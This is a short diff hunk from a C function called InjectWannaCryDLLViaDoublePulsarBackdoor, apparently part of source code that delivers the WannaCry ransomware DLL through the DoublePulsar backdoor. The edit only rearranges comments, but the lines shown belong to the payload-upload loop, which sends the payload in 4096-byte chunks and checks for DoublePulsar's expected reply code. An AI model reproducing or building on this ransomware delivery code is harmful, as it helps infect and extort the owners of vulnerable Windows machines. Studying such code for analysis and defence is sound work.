@@ -325,9 +325,14 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 				//error, doublePulsar should return 82
 				break;
 			}
-			ctx += 4096; //increment counter 
+			//increment counter
+			ctx += 4096;
+
+			//increase offset 
 			OffsetofChunkinPayload += 4096;
-			bytesleft -= 4096; //tracker to see how many bytes we have left
+
+			//subtract sent bytes from bytesLeft 
+			bytesleft -= 4096;
 		}
 	}
 	
